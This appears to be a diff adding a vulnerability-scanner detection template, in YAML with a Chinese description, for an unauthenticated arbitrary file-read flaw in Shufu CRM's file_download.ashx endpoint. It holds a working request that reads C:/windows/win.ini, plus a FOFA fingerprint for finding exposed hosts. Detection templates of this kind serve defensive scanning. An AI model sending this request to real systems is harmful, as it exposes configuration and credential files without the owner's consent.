@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
+          - '[extensions]'
+        case-insensitive: true
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/Web/common/Handler/file_download.ashx?filepath=C:/windows/win.ini'
+id: shufu-crm-file-download-fileread
+info:
+  author: avic123
+  description: |
+    数夫CRM客户关系管理系统  file_download.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    fofa：icon_hash="-244202779"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 数夫CRM客户关系管理系统 file_download.ashx 任意文件读取漏洞
+  severity: high
+  tags: CRM,readfile,argus-import
